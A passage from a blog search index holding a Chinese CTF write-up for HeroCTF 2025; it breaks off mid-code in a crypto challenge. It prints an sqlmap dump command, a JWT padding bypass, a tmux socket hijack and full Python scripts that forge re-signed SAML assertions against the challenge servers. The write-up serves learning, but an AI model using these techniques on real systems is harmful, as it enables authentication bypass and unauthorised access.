<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HeroCTF2025个人题解WP</title>
      <link href="/posts/a36b167f.html"/>
      <url>/posts/a36b167f.html</url>
      
        <content type="html"><![CDATA[<h1 id="WEB">WEB</h1><h2 id="Tomwhat">Tomwhat</h2><p>题目部分源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LightServlet.java</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;darth_sidious&quot;</span>.equalsIgnoreCase(username)) &#123;</span><br><span class="line">            req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;Forbidden username.&quot;</span>);</span><br><span class="line">            doGet(req, resp);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        req.getSession().setAttribute(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        resp.sendRedirect(req.getContextPath() + <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AdminServlet.java</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">s</span> <span class="operator">=</span> req.getSession(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> s == <span class="literal">null</span> ? <span class="literal">null</span> : (String) s.getAttribute(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Admin Panel&lt;/h1&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;darth_sidious&quot;</span>.equalsIgnoreCase(username)) &#123;</span><br><span class="line">            html.append(<span class="string">&quot;&lt;p&gt;Welcome Lord Sidious, Vador says: Hero&#123;fake_flag&#125;.&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            html.append(<span class="string">&quot;&lt;p&gt;Access denied.&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        html.append(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">        resp.getWriter().write(html.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Tomcat 的/examples/路由下有一些例子可以手动更改 session 的值<br>访问 <a href="http://url/examples/servlets/servlet/SessionExample">http://url/examples/servlets/servlet/SessionExample</a></p><p>根据要求，把 username 设成 darth_sidious<br><img src="/img/WP/HeroCTF2025/image.png" alt="alt text"><br>访问 <a href="http://url/dark/admin">http://url/dark/admin</a> 拿到 flag<br><img src="/img/WP/HeroCTF2025/image-1.png" alt="alt text"></p><p>参考链接：<br><a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Tomcat/Tomcat%E6%A0%B7%E4%BE%8B%E7%9B%AE%E5%BD%95session%E6%93%8D%E7%BA%B5%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web安全/Tomcat/Tomcat样例目录session操纵漏洞/</a></p><h2 id="Revoked-Revoked-Revenge">Revoked &amp; Revoked Revenge</h2><p>sqlmap 一把梭到报废 token 中看一个 is_admin=1 的 token</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r <span class="number">1</span>.txt --dbms sqlite --technique U -v <span class="number">3</span> -T revoked_tokens --columns --dump --batch</span><br></pre></td></tr></table></figure><p><img src="/img/WP/HeroCTF2025/image-2.png" alt="alt text"><br>base64 解码得到 admin 的报废 token<br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDQ5NTc4Ny40NDIyNTU1fQ.Wjzeo8h4XvwbONqfJPDTGaPWp3qbXo5CiOAfphqwGBA</p><p>稍微改一下 token，在 JWT 正常识别的情况下就能拿到 flag<br>总所周知，jwt 原理就是 base64 编码，但 Base64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_。<br>所以在 Cookie 最后加一个等于号就绕过了。<br><img src="/img/WP/HeroCTF2025/image-3.png" alt="alt text"></p><h2 id="SAMLevinson">SAMLevinson</h2><p>爬虫题，参考的 CVE 是 CVE-2022-47966，漏洞原理是 golang 处理 saml 时的两种引擎冲突。验证看的是第一个 assert,返回的却是第二个 assert。<br>要自己先生成一个 sha1 的证书 cert.pem 和 key.pem</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out key.pem 2048</span><br><span class="line">openssl req -new -key key.pem -out csr.pem -subj <span class="string">&quot;/CN=saml-test&quot;</span></span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> csr.pem -signkey key.pem -out cert.pem -days 365 -sha1</span><br></pre></td></tr></table></figure><p><a href="http://exp.py">exp.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># Users-&gt;Administrators</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_form_params</span>(<span class="params">html_content</span>):</span><br><span class="line">    soup = BeautifulSoup(html_content, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    form = soup.find(<span class="string">&quot;form&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> form:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取表单基本信息</span></span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: form.get(<span class="string">&quot;action&quot;</span>),</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: form.get(<span class="string">&quot;method&quot;</span>, <span class="string">&quot;get&quot;</span>).upper(),</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: &#123;&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取所有输入字段</span></span><br><span class="line">    inputs = form.find_all(<span class="string">&quot;input&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> input_field <span class="keyword">in</span> inputs:</span><br><span class="line">        name = input_field.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">        value = input_field.get(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        input_type = input_field.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;text&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name:  <span class="comment"># 只处理有 name 属性的字段</span></span><br><span class="line">            form_data[<span class="string">&quot;inputs&quot;</span>][name] = &#123;<span class="string">&quot;value&quot;</span>: value, <span class="string">&quot;type&quot;</span>: input_type&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> form_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://web.heroctf.fr:8080&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://web.heroctf.fr:8081&quot;</span></span><br><span class="line">r1 = requests.get(url=url1 + <span class="string">&quot;/flag&quot;</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> r1.status_code <span class="keyword">in</span> [<span class="number">301</span>, <span class="number">302</span>, <span class="number">303</span>, <span class="number">307</span>, <span class="number">308</span>]:</span><br><span class="line">    location_header = r1.headers.get(<span class="string">&quot;Location&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> location_header:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;重定向到: <span class="subst">&#123;location_header&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析URL和参数</span></span><br><span class="line">        parsed_url = urlparse(location_header)</span><br><span class="line">        params = parse_qs(parsed_url.query)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 简化参数值（parse_qs返回列表）</span></span><br><span class="line">        simple_params = &#123;k: v[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(v) == <span class="number">1</span> <span class="keyword">else</span> v <span class="keyword">for</span> k, v <span class="keyword">in</span> params.items()&#125;</span><br><span class="line"></span><br><span class="line">cookies1 = r1.cookies</span><br><span class="line">r2 = requests.get(url=url2 + <span class="string">&quot;/sso&quot;</span>, params=simple_params)</span><br><span class="line">html = r2.text</span><br><span class="line">dat1 = extract_form_params(html)</span><br><span class="line"><span class="comment"># print(dat[&quot;inputs&quot;][&quot;SAMLRequest&quot;][&quot;value&quot;])</span></span><br><span class="line">data1 = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dat1[<span class="string">&quot;inputs&quot;</span>]:</span><br><span class="line">    data1[i] = dat1[<span class="string">&quot;inputs&quot;</span>][i][<span class="string">&quot;value&quot;</span>]</span><br><span class="line">data1[<span class="string">&quot;user&quot;</span>] = <span class="string">&quot;user&quot;</span></span><br><span class="line">data1[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;oyJPNYd3HgeBkaE%!rP#dZvqf2z*4$^qcCW4V6WM&quot;</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=url2 + <span class="string">&quot;/sso&quot;</span>, data=data1)</span><br><span class="line">html = r2.text</span><br><span class="line">dat2 = extract_form_params(html)</span><br><span class="line"><span class="comment"># print(dat[&quot;inputs&quot;][&quot;SAMLResponse&quot;][&quot;value&quot;])</span></span><br><span class="line">data2 = &#123;<span class="string">&quot;SAMLResponse&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dat2[<span class="string">&quot;inputs&quot;</span>]:</span><br><span class="line">    data2[i] = dat2[<span class="string">&quot;inputs&quot;</span>][i][<span class="string">&quot;value&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decode_response = b64decode(dat2[<span class="string">&quot;inputs&quot;</span>][<span class="string">&quot;SAMLResponse&quot;</span>][<span class="string">&quot;value&quot;</span>]).decode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;original_payload.xml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    w.write(decode_response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;status.xml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    content = decode_response.split(<span class="string">&quot;&lt;saml:Assertion&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    w.write(content)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;assertion.xml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    content = <span class="string">&quot;&lt;saml:Assertion&quot;</span> + decode_response.split(<span class="string">&quot;&lt;saml:Assertion&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    content = content.replace(<span class="string">&quot;&lt;/samlp:Response&gt;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    w.write(content)</span><br><span class="line">result = subprocess.run([<span class="string">&quot;python&quot;</span>, <span class="string">&quot;gen.py&quot;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">output = result.stdout.strip()</span><br><span class="line">err = result.stderr</span><br><span class="line"><span class="built_in">print</span>(err)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.xml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    payload = <span class="built_in">open</span>(<span class="string">&quot;status.xml&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    payload += <span class="built_in">open</span>(<span class="string">&quot;assertion.xml&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    payload += <span class="built_in">open</span>(<span class="string">&quot;assertion2.xml&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    payload += <span class="string">&quot;&lt;/samlp:Response&gt;&quot;</span></span><br><span class="line">    w.write(payload)</span><br><span class="line">output = b64encode(<span class="built_in">open</span>(<span class="string">&quot;payload.xml&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line"></span><br><span class="line">data2[<span class="string">&quot;SAMLResponse&quot;</span>] = output</span><br><span class="line"><span class="built_in">print</span>(data2)</span><br><span class="line">r1 = requests.post(</span><br><span class="line">    url=url1 + <span class="string">&quot;/saml/acs&quot;</span>,</span><br><span class="line">    cookies=cookies1,</span><br><span class="line">    data=data2,</span><br><span class="line">    allow_redirects=<span class="literal">False</span>,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line">cookies1 = r1.cookies</span><br><span class="line">r1 = requests.get(url=url1 + <span class="string">&quot;/flag&quot;</span>, cookies=cookies1, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br></pre></td></tr></table></figure><p><a href="http://gen.py">gen.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> signxml <span class="keyword">import</span> XMLSigner, XMLVerifier</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resign_assertion</span>(<span class="params">assertion_xml, private_key, certificate</span>):</span><br><span class="line">    <span class="comment"># 将user替换为admin，Users替换为Administrators</span></span><br><span class="line">    assertion_modified = assertion_xml.replace(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;admin&quot;</span>).replace(</span><br><span class="line">        <span class="string">&quot;Users&quot;</span>, <span class="string">&quot;Administrators&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成新的ID</span></span><br><span class="line">    new_id = <span class="string">&quot;id-&quot;</span> + <span class="built_in">str</span>(uuid.uuid4().<span class="built_in">hex</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移除原有的签名</span></span><br><span class="line">    assertion_clean = re.sub(</span><br><span class="line">        <span class="string">r&quot;&lt;ds:Signature.*?&lt;/ds:Signature&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, assertion_modified, flags=re.DOTALL</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 替换ID</span></span><br><span class="line">    assertion_clean = re.sub(<span class="string">r&#x27;ID=&quot;[^&quot;]*&quot;&#x27;</span>, <span class="string">f&#x27;ID=&quot;<span class="subst">&#123;new_id&#125;</span>&quot;&#x27;</span>, assertion_clean)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在Issuer后面插入新的签名占位符</span></span><br><span class="line">    issuer_end = assertion_clean.find(<span class="string">&quot;&lt;/saml:Issuer&gt;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;&lt;/saml:Issuer&gt;&quot;</span>)</span><br><span class="line">    assertion_with_placeholder = (</span><br><span class="line">        assertion_clean[:issuer_end]</span><br><span class="line">        + <span class="string">&#x27;&lt;ds:Signature xmlns:ds=&quot;http://www.w3.org/2000/09/xmldsig#&quot; Id=&quot;placeholder&quot;&gt;&lt;/ds:Signature&gt;&#x27;</span></span><br><span class="line">        + assertion_clean[issuer_end:]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重新签名</span></span><br><span class="line">    assertion_root = etree.fromstring(assertion_with_placeholder.encode())</span><br><span class="line">    signed_assertion = XMLSigner(</span><br><span class="line">        c14n_algorithm=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>,</span><br><span class="line">        signature_algorithm=<span class="string">&quot;rsa-sha1&quot;</span>,</span><br><span class="line">        digest_algorithm=<span class="string">&quot;sha1&quot;</span>,</span><br><span class="line">    ).sign(assertion_root, key=private_key, cert=certificate)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> etree.tostring(signed_assertion, encoding=<span class="string">&quot;unicode&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;assertion.xml&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    assertion_xml = file.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cert.pem&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> cert, <span class="built_in">open</span>(<span class="string">&quot;key.pem&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> key:</span><br><span class="line">    certificate = cert.read()</span><br><span class="line">    private_key = key.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新签名Assertion</span></span><br><span class="line">resigned_assertion = resign_assertion(assertion_xml, private_key, certificate)</span><br><span class="line">resigned_assertion = resigned_assertion.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入assertion2.xml</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;assertion2.xml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> w:</span><br><span class="line">    w.write(resigned_assertion)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;修改并重新签名的Assertion已保存到 assertion2.xml&quot;</span>)</span><br></pre></td></tr></table></figure><p>参考链接<br><a href="https://www.bilibili.com/opus/824399670911434755">https://www.bilibili.com/opus/824399670911434755</a><br><img src="/img/WP/HeroCTF2025/image-4.png" alt="alt text"><br>更改 user 为 admin 非必要</p><h1 id="System">System</h1><h2 id="Movie-Night-1">Movie Night #1</h2><p>不是很会提到 root 权限<br>第一题是读取/home/dev/flag.txt</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps auxf</span><br><span class="line">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">dev           31  0.0  0.0   4548  3192 ?        Ss   09:56   0:00 tmux -S /tmp/tmux-1002 new-session -d -s work bash</span><br><span class="line">dev           32  0.0  0.0   4196  3504 pts/0    Ss+  09:56   0:00  \_ bash</span><br></pre></td></tr></table></figure><p>看到 dev 开了一个 tmux 的 shell,直接连进去读它的文件就行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tmux -S /tmp/tmux-1002 attach</span><br><span class="line"><span class="built_in">cat</span> /home/dev/flag.txt</span><br></pre></td></tr></table></figure><p><img src="/img/WP/HeroCTF2025/image-5.png" alt="alt text"></p><h1 id="Crypto">Crypto</h1><h2 id="Andor">Andor</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">AND = <span class="keyword">lambda</span> x, y: [a &amp; b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x, y)]</span><br><span class="line">IOR = <span class="keyword">lambda</span> x, y: [a | b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x, y)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = [*f.read().strip()]</span><br><span class="line">    l = <span class="built_in">len</span>(flag) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    k = secrets.token_bytes(<span class="built_in">len</span>(flag))</span><br><span class="line">    a = AND(flag[:l], k[:l])</span><br><span class="line">    o = IOR(flag[l:], k[l:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, <span class="built_in">bytearray</span>(a).<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;o =&quot;</span>, <span class="built_in">bytearray</span>(o).<span class="built_in">hex</span>())</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br></pre></td></tr></table></figure><p>前半部分：<br>a[i]=flag[i] &amp; k[i]<br>后半部分：<br>o[i]=flag[i] | k[i]</p><p>k[i]取{0,1}，可以看出当 flag[i]=0 时，a[i]总为 0，flag[i]=1 时，o[i]总为 1，所以当获取足够多的数据时，就能得到 flag 的所有位的比特值。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># 连接服务器</span></span><br><span class="line">conn = remote(<span class="string">&quot;crypto.heroctf.fr&quot;</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储样本</span></span><br><span class="line">a_samples = []</span><br><span class="line">o_samples = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 收集足够多的样本</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在收集样本...&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):  <span class="comment"># 200次应该足够</span></span><br><span class="line">        conn.recvuntil(<span class="string">b&quot;a = &quot;</span>)</span><br><span class="line">        a_hex = conn.recvline().decode().strip()</span><br><span class="line">        a_bytes = <span class="built_in">bytes</span>.fromhex(a_hex)</span><br><span class="line">        a_samples.append(a_bytes)</span><br><span class="line">        conn.recvuntil(<span class="string">b&quot;o = &quot;</span>)</span><br><span class="line">        o_hex = conn.recvline().decode().strip()</span><br><span class="line">        o_bytes = <span class="built_in">bytes</span>.fromhex(o_hex)</span><br><span class="line">        o_samples.append(o_bytes)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送任意输入继续</span></span><br><span class="line">        conn.sendline(<span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">20</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;已收集 <span class="subst">&#123;i + <span class="number">1</span>&#125;</span> 个样本&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;连接结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;收集完成，共 <span class="subst">&#123;<span class="built_in">len</span>(a_samples)&#125;</span> 个样本&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a_samples)</span><br><span class="line"><span class="built_in">print</span>(o_samples)</span><br><span class="line"><span class="comment"># 计算flag长度</span></span><br><span class="line">flag_len = <span class="built_in">len</span>(a_samples[<span class="number">0</span>]) * <span class="number">2</span></span><br><span class="line">l = <span class="built_in">len</span>(a_samples[<span class="number">0</span>])  <span class="comment"># 前半部分长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag长度: <span class="subst">&#123;flag_len&#125;</span>, 前半部分长度: <span class="subst">&#123;l&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复前半部分 (AND部分)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;恢复前半部分...&quot;</span>)</span><br><span class="line">flag_first_half = <span class="built_in">bytearray</span>(l)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    byte_val = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> sample <span class="keyword">in</span> a_samples:</span><br><span class="line">        byte_val |= sample[i]  <span class="comment"># 按位或</span></span><br><span class="line">    flag_first_half[i] = byte_val</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复后半部分 (OR部分)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;恢复后半部分...&quot;</span>)</span><br><span class="line">flag_second_half = <span class="built_in">bytearray</span>(l)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    byte_val = <span class="number">0xFF</span>  <span class="comment"># 初始全1</span></span><br><span class="line">    <span class="keyword">for</span> sample <span class="keyword">in</span> o_samples:</span><br><span class="line">        byte_val &amp;= sample[i]  <span class="comment"># 按位与</span></span><br><span class="line">    flag_second_half[i] = byte_val</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合flag</span></span><br><span class="line">flag_bytes = flag_first_half + flag_second_half</span><br><span class="line">flag = <span class="built_in">bytes</span>(flag_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;恢复的flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ASCII: <span class="subst">&#123;flag.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;recovered_flag.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag已保存到 recovered_flag.txt&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Perilous">Perilous</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.decrepit.ciphers <span class="keyword">import</span> algorithms</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read()</span><br><span class="line"></span><br><span class="line">MASK = os.urandom(<span class="built_in">len</span>(FLAG))</span><br><span class="line">KEYS = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a: <span class="built_in">bytes</span>, b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b * (<span class="number">1</span> + <span class="built_in">len</span>(a) // <span class="built_in">len</span>(b))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">k: <span class="built_in">str</span>, m: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    k = <span class="built_in">bytes</span>.fromhex(k)</span><br><span class="line">    m = <span class="built_in">bytes</span>.fromhex(m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> KEYS:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Duplicate key used, aborting&quot;</span>)</span><br><span class="line"></span><br><span class="line">    KEYS.append(k)</span><br><span class="line"></span><br><span class="line">    algorithm = algorithms.ARC4(k)</span><br><span class="line">    cipher = Cipher(algorithm, mode=<span 